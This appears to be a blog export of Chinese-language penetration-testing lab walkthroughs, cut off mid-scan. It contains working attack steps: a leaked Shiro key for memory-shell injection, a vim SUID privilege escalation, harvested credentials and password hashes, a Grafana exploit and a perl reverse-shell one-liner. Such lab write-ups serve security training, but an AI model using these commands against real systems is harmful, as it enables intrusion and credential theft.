org.springframework.web.servlet.mvc.HttpRequestHandlerAdapter,org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter,org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter,org.springframework.web.servlet.function.support.HandlerFunctionAdapter\norg.springframework.web.servlet.FlashMapManager = org.springframework.web.servlet.support.SessionFlashMapManager\npackage.definition = sun.,com.sun.xml.internal.,com.sun.imageio.,com.sun.istack.internal.,com.sun.jmx.,com.sun.media.sound.,com.sun.naming.internal.,com.sun.proxy.,com.sun.corba.se.,com.sun.org.apache.bcel.internal.,com.sun.org.apache.regexp.internal.,com.sun.org.apache.xerces.internal.,com.sun.org.apache.xpath.internal.,com.sun.org.apache.xalan.internal.extensions.,com.sun.org.apache.xalan.internal.lib.,com.sun.org.apache.xalan.internal.res.,com.sun.org.apache.xalan.internal.templates.,com.sun.org.apache.xalan.internal.utils.,com.sun.org.apache.xalan.internal.xslt.,com.sun.org.apache.xalan.internal.xsltc.cmdline.,com.sun.org.apache.xalan.internal.xsltc.compiler.,com.sun.org.apache.xalan.internal.xsltc.trax.,com.sun.org.apache.xalan.internal.xsltc.util.,com.sun.org.apache.xml.internal.res.,com.sun.org.apache.xml.internal.resolver.helpers.,com.sun.org.apache.xml.internal.resolver.readers.,com.sun.org.apache.xml.internal.security.,com.sun.org.apache.xml.internal.serializer.utils.,com.sun.org.apache.xml.internal.utils.,com.sun.org.glassfish.,com.oracle.xmlns.internal.,com.oracle.webservices.internal.,oracle.jrockit.jfr.,org.jcp.xml.dsig.internal.,jdk.internal.,jdk.nashorn.internal.,jdk.nashorn.tools.,jdk.xml.internal.,com.sun.activation.registries.,jdk.jfr.events.,jdk.jfr.internal.,jdk.management.jfr.internal.\nsun.boot.class.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classes\njava.protocol.handler.pkgs = org.springframework.boot.loader\nsun.management.compiler = HotSpot 64-Bit Tiered Compilers\norg.springframework.web.servlet.ThemeResolver = org.springframework.web.servlet.theme.FixedThemeResolver\njava.runtime.version = 1.8.0_392-8u392-ga-1~20.04-b08\nuser.name = app\npolicy.url.1 = file:${java.home}/lib/security/java.policy\nsecurerandom.source = file:/dev/random\npolicy.url.2 = file:${user.home}/.java.policy\njdk.tls.disabledAlgorithms = SSLv3, TLSv1, TLSv1.1, RC4, DES, MD5withRSA, DH keySize < 1024, EC keySize < 224, 3DES_EDE_CBC, anon, NULL, include jdk.disabled.namedCurves\npolicy.ignoreIdentityScope = false\nfile.encoding = UTF-8\njava.util.logging.ConsoleHandler.formatter = java.util.logging.SimpleFormatter\njdk.sasl.disabledMechanisms =\njava.io.tmpdir = /tmp\norg.springframework.web.servlet.ViewResolver = org.springframework.web.servlet.view.InternalResourceViewResolver\njava.version = 1.8.0_392\njava.vm.specification.name = Java Virtual Machine Specification\njdk.tls.keyLimits = AES/GCM/NoPadding KeyUpdate 2^37\nPID = 750\njava.awt.printerjob = sun.print.PSPrinterJob\njdk.xml.dsig.secureValidationPolicy = disallowAlg http://www.w3.org/TR/1999/REC-xslt-19991116,disallowAlg http://www.w3.org/2001/04/xmldsig-more#rsa-md5,disallowAlg http://www.w3.org/2001/04/xmldsig-more#hmac-md5,disallowAlg http://www.w3.org/2001/04/xmldsig-more#md5,maxTransforms 5,maxReferences 30,disallowReferenceUriSchemes file http https,minKeySize RSA 1024,minKeySize DSA 1024,minKeySize EC 224,noDuplicateIds,noRetrievalMethodLoops\njava.library.path = /usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/lib\njava.vendor = Private Build\njava.specification.maintenance.version = 5\nhandlers = java.util.logging.ConsoleHandler\nsun.io.unicode.encoding = UnicodeLittle\nkrb5.kdc.bad.policy = tryLast\njava.class.path = /app/login-1.0-SNAPSHOT.jar\njava.vm.vendor = Private Build\njdk.security.legacyAlgorithms = SHA1, RSA keySize < 2048, DSA keySize < 2048\njdk.disabled.namedCurves = secp112r1, secp112r2, secp128r1, secp128r2, secp160k1, secp160r1, secp160r2, secp192k1, secp192r1, secp224k1, secp224r1, secp256k1, sect113r1, sect113r2, sect131r1, sect131r2, sect163k1, sect163r1, sect163r2, sect193r1, sect193r2, sect233k1, sect233r1, sect239k1, sect283k1, sect283r1, sect409k1, sect409r1, sect571k1, sect571r1, X9.62 c2tnb191v1, X9.62 c2tnb191v2, X9.62 c2tnb191v3, X9.62 c2tnb239v1, X9.62 c2tnb239v2, X9.62 c2tnb239v3, X9.62 c2tnb359v1, X9.62 c2tnb431r1, X9.62 prime192v2, X9.62 prime192v3, X9.62 prime239v1, X9.62 prime239v2, X9.62 prime239v3, brainpoolP256r1, brainpoolP320r1, brainpoolP384r1, brainpoolP512r1\ncrypto.policy = unlimited\njceks.key.serialFilter = java.lang.Enum;java.security.KeyRep;java.security.KeyRep$Type;javax.crypto.spec.SecretKeySpec;!*\nlogin.configuration.provider = sun.security.provider.ConfigFile\nuser.timezone =\njava.vm.specification.version = 1.8\nos.name = Linux\nuser.country = US\njdk.security.caDistrustPolicies = SYMANTEC_TLS\nsun.cpu.endian = little\nuser.home = /home/app\nuser.language = en\nen = UTF-8\njdk.tls.alpnCharset = ISO_8859_1\nssl.KeyManagerFactory.algorithm = SunX509\n.level = INFO\njava.awt.graphicsenv = sun.awt.X11GraphicsEnvironment\njava.awt.headless = true\ncom.xyz.foo.level = SEVERE\npolicy.provider = sun.security.provider.PolicyFile\npath.separator = :\nfr = UTF-8\nos.version = 5.4.0-164-generic\njava.endorsed.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsed\njava.runtime.name = OpenJDK Runtime Environment\nkeystore.type.compat = true\norg.springframework.web.servlet.RequestToViewNameTranslator = org.springframework.web.servlet.view.DefaultRequestToViewNameTranslator\nspring.beaninfo.ignore = true\njava.vm.name = OpenJDK 64-Bit Server VM\njava.vendor.url.bug = http://bugreport.sun.com/bugreport/\njava.util.logging.FileHandler.formatter = java.util.logging.XMLFormatter\njava.util.logging.FileHandler.count = 1\ncatalina.home = /tmp/tomcat.5978727065775558529.8080\nsun.cds.enableSharedLookupCache = false\nsun.security.krb5.maxReferrals = 5\ncatalina.base = /tmp/tomcat.5978727065775558529.8080\njava.util.logging.FileHandler.limit = 50000\njava.vm.info = mixed mode\nkeystore.type = jks\njava.ext.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/ext\npolicy.expandProperties = true\nsecurerandom.strongAlgorithms = NativePRNGBlocking:SUN\n\n===========================================\nProcessEnvironment\n-------------\nnot found!\n\n===========================================\nOSS\n-------------\nnot found!\n\n===========================================\nUserPassSearcher\n-------------\norg.apache.shiro.web.filter.authc.FormAuthenticationFilter:\n[failureKeyAttribute = shiroLoginFailure, loginUrl = /login, successUrl = /, usernameParam = username, passwordParam = password]\n\norg.apache.catalina.startup.Tomcat:\n[hostname = localhost]\n\n\n===========================================\nCookieThief\n-------------\nnot found!\n\n===========================================\nAuthThief\n-------------\nnot found!\n\n===========================================\n~~~\n\næœ‰ä¸€ä¸ªshirokey\n\n~~~\nalgMode = CBC, key = GAYysgMQhG7/CzIJlVpR2g==, algName = AES\n~~~\n\nç”¨shiroå·¥å…·æ³¨å…¥å†…å­˜é©¬,å†°èè¿æ¥å³å¯\n\nvim.basicå­˜åœ¨suidæƒé™\n\n~~~\napp@web01:~$ find / -perm -u=s -type f 2>/dev/null\nfind / -perm -u=s -type f 2>/dev/null\n\n/usr/bin/vim.basic\n/usr/bin/su\n/usr/bin/newgrp\n/usr/bin/staprun\n/usr/bin/at\n/usr/bin/passwd\n/usr/bin/gpasswd\n/usr/bin/umount\n/usr/bin/chfn\n/usr/bin/stapbpf\n/usr/bin/sudo\n/usr/bin/chsh\n/usr/bin/fusermount\n/usr/bin/mount\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n~~~\n\nç³»ç»Ÿå­˜åœ¨python3ç¯å¢ƒï¼Œ å‚è€ƒhttps://gtfobins.github.io/gtfobins/vim/ ææƒï¼Œflag01åœ¨/root/flagä¸‹\n\n~~~\n/usr/bin/vim.basic -c ':python3 import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'\n~~~\n\n# flag02\n\nç„¶åæ­å»ºä¸€ä¸ªä»£ç†éš§é“ï¼Œä¸Šä¼ ä¸€ä¸ªfscanå¼€å§‹æ‰«æ\n\n~~~\nip a   \n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host \n       valid_lft forever preferred_lft forever\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:16:3e:0d:aa:83 brd ff:ff:ff:ff:ff:ff\n    inet 172.30.12.5/16 brd 172.30.255.255 scope global dynamic eth0\n       valid_lft 315357949sec preferred_lft 315357949sec\n    inet6 fe80::216:3eff:fe0d:aa83/64 scope link \n       valid_lft forever preferred_lft forever\n       \n       ./fscan -h 172.30.12.1/24\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚    ___                              _        â”‚\nâ”‚   / _ \\     ___  ___ _ __ __ _  ___| | __    â”‚\nâ”‚  / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /    â”‚\nâ”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   <     â”‚\nâ”‚ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n      Fscan Version: 2.0.0\n\n[2025-04-10 17:23:09] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1\n[2025-04-10 17:23:09] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ\n[2025-04-10 17:23:09] [INFO] CIDRèŒƒå›´: 172.30.12.0-172.30.12.255\n[2025-04-10 17:23:10] [INFO] ç”ŸæˆIPèŒƒå›´: 172.30.12.0.%!d(string=172.30.12.255) - %!s(MISSING).%!d(MISSING)\n[2025-04-10 17:23:10] [INFO] è§£æCIDR 172.30.12.1/24 -> IPèŒƒå›´ 172.30.12.0-172.30.12.255\n[2025-04-10 17:23:10] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256\n[2025-04-10 17:23:10] [INFO] å¼€å§‹ä¸»æœºæ‰«æ\n[2025-04-10 17:23:10] [SUCCESS] ç›®æ ‡ 172.30.12.5     å­˜æ´» (ICMP)\n[2025-04-10 17:23:10] [SUCCESS] ç›®æ ‡ 172.30.12.6     å­˜æ´» (ICMP)\n[2025-04-10 17:23:10] [SUCCESS] ç›®æ ‡ 172.30.12.236   å­˜æ´» (ICMP)\n[2025-04-10 17:23:13] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 3\n[2025-04-10 17:23:13] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233\n[2025-04-10 17:23:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.30.12.236:22\n[2025-04-10 17:23:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.30.12.6:445\n[2025-04-10 17:23:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.30.12.6:139\n[2025-04-10 17:23:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.30.12.6:135\n[2025-04-10 17:23:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.30.12.5:22\n[2025-04-10 17:23:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.30.12.236:8009\n[2025-04-10 17:23:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.30.12.5:8080\n[2025-04-10 17:23:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.30.12.236:8080\n[2025-04-10 17:23:13] [SUCCESS] æœåŠ¡è¯†åˆ« 172.30.12.236:22 => [ssh] ç‰ˆæœ¬:8.2p1 Ubuntu 4ubuntu0.9 äº§å“:OpenSSH ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.]\n[2025-04-10 17:23:13] [SUCCESS] æœåŠ¡è¯†åˆ« 172.30.12.5:22 => [ssh] ç‰ˆæœ¬:8.2p1 Ubuntu 4ubuntu0.9 äº§å“:OpenSSH ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.]\n[2025-04-10 17:23:13] [SUCCESS] ç«¯å£å¼€æ”¾ 172.30.12.6:8848\n[2025-04-10 17:23:18] [SUCCESS] æœåŠ¡è¯†åˆ« 172.30.12.6:445 => \n[2025-04-10 17:23:18] [SUCCESS] æœåŠ¡è¯†åˆ« 172.30.12.6:139 =>  Banner:[.]\n[2025-04-10 17:23:18] [SUCCESS] æœåŠ¡è¯†åˆ« 172.30.12.236:8009 => \n[2025-04-10 17:23:18] [SUCCESS] æœåŠ¡è¯†åˆ« 172.30.12.5:8080 => [http]\n[2025-04-10 17:23:19] [SUCCESS] æœåŠ¡è¯†åˆ« 172.30.12.236:8080 => [http]\n[2025-04-10 17:23:24] [SUCCESS] æœåŠ¡è¯†åˆ« 172.30.12.6:8848 => [http]\n[2025-04-10 17:24:18] [SUCCESS] æœåŠ¡è¯†åˆ« 172.30.12.6:135 => \n[2025-04-10 17:24:18] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 9\n[2025-04-10 17:24:18] [INFO] å¼€å§‹æ¼æ´æ‰«æ\n[2025-04-10 17:24:18] [INFO] åŠ è½½çš„æ’ä»¶: findnet, ms17010, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle\n[2025-04-10 17:24:18] [SUCCESS] NetBios 172.30.12.6     WORKGROUP\\SERVER02            \n[2025-04-10 17:24:18] [SUCCESS] NetInfo æ‰«æç»“æœ\nç›®æ ‡ä¸»æœº: 172.30.12.6\nä¸»æœºå: Server02\nå‘ç°çš„ç½‘ç»œæ¥å£:\n   IPv4åœ°å€:\n      â””â”€ 172.30.12.6\n[2025-04-10 17:24:18] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.30.12.5:8080   çŠ¶æ€ç :302 é•¿åº¦:0      æ ‡é¢˜:æ— æ ‡é¢˜ é‡å®šå‘åœ°å€: http://172.30.12.5:8080/login;jsessionid=BD7C602596372F417AEEB44C6651A392\n[2025-04-10 17:24:18] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.30.12.236:8080 çŠ¶æ€ç :200 é•¿åº¦:3964   æ ‡é¢˜:åŒ»é™¢åå°ç®¡ç†å¹³å°\n[2025-04-10 17:24:19] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.30.12.5:8080/login;jsessionid=BD7C602596372F417AEEB44C6651A392 çŠ¶æ€ç :200 é•¿åº¦:2005   æ ‡é¢˜:åŒ»ç–—ç®¡ç†åå°\n[2025-04-10 17:24:19] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.30.12.6:8848   çŠ¶æ€ç :404 é•¿åº¦:431    æ ‡é¢˜:HTTP Status 404 â€“ Not Found\n[2025-04-10 17:24:20] [SUCCESS] ç›®æ ‡: http://172.30.12.5:8080\n  æ¼æ´ç±»å‹: poc-yaml-spring-actuator-heapdump-file\n  æ¼æ´åç§°: \n  è¯¦ç»†ä¿¡æ¯:\n        author:AgeloVito\n        links:https://www.cnblogs.com/wyb628/p/8567610.html\n[2025-04-10 17:24:20] [SUCCESS] ç›®æ ‡: http://172.30.12.6:8848\n  æ¼æ´ç±»å‹: poc-yaml-alibaba-nacos\n  æ¼æ´åç§°: \n  è¯¦ç»†ä¿¡æ¯:\n        author:AgeloVito\n        links:https://blog.csdn.net/caiqiiqi/article/details/112005424\n[2025-04-10 17:24:21] [SUCCESS] ç›®æ ‡: http://172.30.12.6:8848\n  æ¼æ´ç±»å‹: poc-yaml-alibaba-nacos-v1-auth-bypass\n  æ¼æ´åç§°: \n  è¯¦ç»†ä¿¡æ¯:\n        author:kmahyyg(https://github.com/kmahyyg)\n        links:https://github.com/alibaba/nacos/issues/4593\n~~~\n\næ‰«åˆ°äº†ä¸€ä¸ªnacosï¼Œé‚£å°±ä»è¿™é‡Œå…¥æ‰‹ï¼Œå¼±å£ä»¤nacos/nacosç™»å½•,è¿™ä¸ªæ¡†æ¶è¿˜å­˜åœ¨yamlååºåˆ—åŒ–æ¼æ´\n\nåœ¨172.30.12.5ä¸Šé¢æ”¾ä¸Šæ¶æ„çš„jaræ–‡ä»¶ï¼Œç„¶åå¼€å¯ä¸€ä¸ªwebæœåŠ¡ï¼Œå†ç”¨åˆ©ç”¨å·¥å…·å»æ‰§è¡Œ\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# nxc rdp 172.30.12.6 -u lv -p Asd123132. --local-auth\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.30.12.6:3389  ...  OK\n[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.30.12.6:3389  ...  OK\n[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.30.12.6:3389  ...  OK\n[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.30.12.6:3389  ...  OK\nRDP         172.30.12.6     3389   Server02         [*] Windows 10 or Windows Server 2016 Build 17763 (name:Server02) (domain:Server02) (nla:True)\n[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.30.12.6:3389  ...  OK\nRDP         172.30.12.6     3389   Server02         [+] Server02\\lv:Asd123132. (Pwn3d!)\n~~~\n\nç”¨æˆ·æ·»åŠ æˆåŠŸäº†ï¼ŒæŒ‚ä¸Šä»£ç†ï¼Œè¿œç¨‹æ¡Œé¢è¿æ¥ï¼Œflag02åœ¨C:\\Users\\Administrator\\flagä¸‹\n\n# flag03\n\n172.30.12.236ä¸»æœºå¼€æ”¾äº†8009ç«¯å£ï¼Œç™»å½•å£ä¼ å…¥çš„æ•°æ®ä¸º JSON æ ¼å¼ã€‚æ¢æµ‹ fastjson ç‰ˆæœ¬ payloadï¼š`{\"@type\": \"java.lang.AutoCloseable\"`\n\nhttps://raw.githubusercontent.com/h0ny/repo/main/images/2ed229594166743d.png)\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital1.png)\n\nç”¨[bpçš„æ’ä»¶](https://github.com/amaz1ngday/fastjson-exp)æ³¨å…¥å†…å­˜é©¬,å“¥æ–¯æ‹‰è¿æ¥ï¼Œflag03åœ¨/root/flag/ä¸‹\n\n# flag04\n\nè¿™ä¸ªé¶æœºè¿˜æœ‰ç¬¬äºŒå¼ ç½‘å¡\n\n~~~\n/ >ip a\n\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host \n       valid_lft forever preferred_lft forever\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:16:3e:0d:aa:e2 brd ff:ff:ff:ff:ff:ff\n    inet 172.30.12.236/16 brd 172.30.255.255 scope global dynamic eth0\n       valid_lft 315354333sec preferred_lft 315354333sec\n    inet6 fe80::216:3eff:fe0d:aae2/64 scope link \n       valid_lft forever preferred_lft forever\n3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:16:3e:0d:aa:92 brd ff:ff:ff:ff:ff:ff\n    inet 172.30.54.179/24 brd 172.30.54.255 scope global eth1\n       valid_lft forever preferred_lft forever\n    inet6 fe80::216:3eff:fe0d:aa92/64 scope link \n       valid_lft forever preferred_lft forever\n~~~\n\nä¸Šä¼ ä¸€ä¸ªfscanï¼Œç„¶åæ‰«ä¸€ä¸‹ï¼Œåœ°å€ä¸º172.30.54.12ï¼Œéœ€è¦äºŒå±‚å†…ç½‘ä»£ç†ï¼Œè¿™å°æœºå™¨ä¸Šæœ‰**grafana+postgres**ä¸¤ä¸ªæœåŠ¡ï¼Œgrafanaå­˜åœ¨å¼±å£ä»¤admin/adminç™»å½•,åœ¨web3çš„æœºå™¨ä¸Šä¸Šä¼ ä¸€ä¸ª[exp](https://github.com/A-D-Team/grafanaExp),å¯ä»¥è·‘åˆ°postgresçš„å¯†ç \n\n~~~\n2024/07/04 12:20:59 Target vulnerable has plugin [alertlist]\n2024/07/04 12:20:59 Got secret_key [SW2YcwTIb9zpOOhoPsMm]\n2024/07/04 12:20:59 There is [0] records in db.\n2024/07/04 12:20:59 type:[postgres]     name:[PostgreSQL]               url:[localhost:5432]    user:[postgres] password[Postgres@123] database:[postgres]     basic_auth_user:[]      basic_auth_password:[]\n2024/07/04 12:20:59 All Done, have nice day!\n~~~\n\n`psql -h 172.30.54.12 -p 5432 -U postgres`è¿æ¥,æŸ¥è¯¢rootçš„å¯†ç `select usename, passwd from pg_shadow;`\n\n~~~\npostgres=# select usename, passwd from pg_shadow;\n usename  |               passwd\n----------+-------------------------------------\n root     | md5da974531914a7c2c56df745574a5bd3a\n postgres | md5dd27d33705155fd675e498384ad3d2ea\n~~~\n\nçˆ†ç ´å‡ºæ¥æ˜¯`P@ssw0rd123`,åœ¨web03çš„æœºå™¨ä¸Šç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œç„¶åç”¨perlåå¼¹ä¸€ä¸ªshell\n\n~~~\nselect system('perl -e \\'use Socket;$i=\"172.30.54.179\";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\\'');\n~~~\n\nç„¶åpsqlææƒï¼Œflag04åœ¨/root/flag/ä¸‹\n","tags":["é¶æœº"],"categories":["æ˜¥ç§‹äº‘é•œ"]},{"title":"æ˜¥ç§‹äº‘é•œ-Time","url":"/2025/04/09/æ˜¥ç§‹äº‘é•œ-Time/","content":"\n\n\n# FLAG1\n\né¦–å…ˆç”¨fscanè¿›è¡Œä¿¡æ¯æœé›†\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]\nâ””â”€# ../pentest/fscan/fscan2 -h 39.98.117.163 -p 1-65535\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚    ___                              _        â”‚\nâ”‚   / _ \\     ___  ___ _ __ __ _  ___| | __    â”‚\nâ”‚  / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /    â”‚\nâ”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   <     â”‚\nâ”‚ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n      Fscan Version: 2.0.0\n\n[2025-04-08 12:36:27] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1\n[2025-04-08 12:36:27] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ\n[2025-04-08 12:36:27] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 1\n[2025-04-08 12:36:27] [INFO] å¼€å§‹ä¸»æœºæ‰«æ\n[2025-04-08 12:36:27] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 65535\n[2025-04-08 12:36:27] [SUCCESS] ç«¯å£å¼€æ”¾ 39.98.117.163:22\n[2025-04-08 12:36:28] [SUCCESS] æœåŠ¡è¯†åˆ« 39.98.117.163:22 => [ssh] ç‰ˆæœ¬:8.2p1 Ubuntu 4ubuntu0.5 äº§å“:OpenSSH ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]\n[2025-04-08 12:37:17] [SUCCESS] ç«¯å£å¼€æ”¾ 39.98.117.163:1337\n[2025-04-08 12:37:27] [SUCCESS] æœåŠ¡è¯†åˆ« 39.98.117.163:1337 =>\n[2025-04-08 12:41:00] [SUCCESS] ç«¯å£å¼€æ”¾ 39.98.117.163:7473\n[2025-04-08 12:41:01] [SUCCESS] ç«¯å£å¼€æ”¾ 39.98.117.163:7474\n[2025-04-08 12:41:08] [SUCCESS] ç«¯å£å¼€æ”¾ 39.98.117.163:7687\n[2025-04-08 12:41:11] [SUCCESS] æœåŠ¡è¯†åˆ« 39.98.117.163:7473 =>  Banner:[.P]\n[2025-04-08 12:41:11] [SUCCESS] æœåŠ¡è¯†åˆ« 39.98.117.163:7474 => [http]\n[2025-04-08 12:41:18] [SUCCESS] æœåŠ¡è¯†åˆ« 39.98.117.163:7687 =>\n~~~\n\nfscanæ‰«æé¶æœºï¼Œæœ‰1337ã€7473ã€7474ã€7687ç«¯å£ï¼Œ7474ç«¯å£æ˜¯neo4jï¼Œé»˜è®¤å¯†ç neo4j:neo4j(å¯ä»¥ç™»å½•ï¼Œä½†æ˜¯æ²¡ä»€ä¹ˆç”¨)ï¼Œè¿˜æœ‰ä¸€ä¸ªCVE-2021-34371ï¼Œå¯ä»¥ç›´æ¥ä¸€æŠŠæ¢­å“ˆhttps://github.com/zwjjustdoit/CVE-2021-34371.jarï¼Œåå¼¹ä¸€ä¸ªshell\n\nflag01åœ¨neo4jçš„ç›®å½•ä¸‹\n\n# FLAG2\n\nç„¶åä¸Šä¼ ä¸€ä¸ªfscanæ‰«æå†…ç½‘ï¼ˆä¼šå‡ºæ¥æ²¡æ‰«æå‡ºæ¥çš„æƒ…å†µï¼Œéœ€è¦å¤šæ‰«æå‡ æ¬¡ï¼‰\n\n~~~\nneo4j@ubuntu:~$ ./fscan -h 172.22.6.36/20\n./fscan -h 172.22.6.36/20\n\n   ___                              _    \n  / _ \\     ___  ___ _ __ __ _  ___| | __ \n / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   <    \n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\   \n                     fscan version: 1.8.4\nstart infoscan\ntrying RunIcmp2\nThe current user permissions unable to send icmp packets\nstart ping\n(icmp) Target 172.22.6.25     is alive\n(icmp) Target 172.22.6.36     is alive\n(icmp) Target 172.22.6.38     is alive\n\n[*] LiveTop 172.22.0.0/16    æ®µå­˜æ´»æ•°é‡ä¸º: 3\n[*] LiveTop 172.22.6.0/24    æ®µå­˜æ´»æ•°é‡ä¸º: 3\n[*] Icmp alive hosts len is: 3\n172.22.6.36:22 open\n172.22.6.25:445 open\n172.22.6.25:139 open\n172.22.6.25:135 open\n172.22.6.38:80 open\n172.22.6.38:22 open\n172.22.6.36:7687 open\n172.22.6.25:445 open\n172.22.6.12:445 open\n172.22.6.12:139 open\n172.22.6.25:139 open\n172.22.6.25:135 open\n172.22.6.12:135 open\n172.22.6.12:88 open\n\nstart vulscan\n[*] NetInfo \n[*]172.22.6.25\n   [->]WIN2019\n   [->]172.22.6.25\n[*] NetInfo \n[*]172.22.6.12\n   [->]DC-PROGAME\n   [->]172.22.6.12\n[*] NetBios 172.22.6.25     XIAORANG\\WIN2019              \n[*] OsInfo 172.22.6.12  (Windows Server 2016 Datacenter 14393)\n[*] NetBios 172.22.6.12     [+] DC:DC-PROGAME.xiaorang.lab       Windows Server 2016 Datacenter 14393\n[*]172.22.6.25\n   [->]WIN2019\n   [->]172.22.6.25\n[*] NetBios 172.22.6.25     XIAORANG\\WIN2019              \n[*] WebTitle http://172.22.6.38        code:200 len:1531   \ntitle:åå°ç™»å½•\n[*] WebTitle https://172.22.6.36:7687  code:400 len:50    \ntitle:None\nå·²å®Œæˆ 7/7\n[*] æ‰«æç»“æŸ,è€—æ—¶: 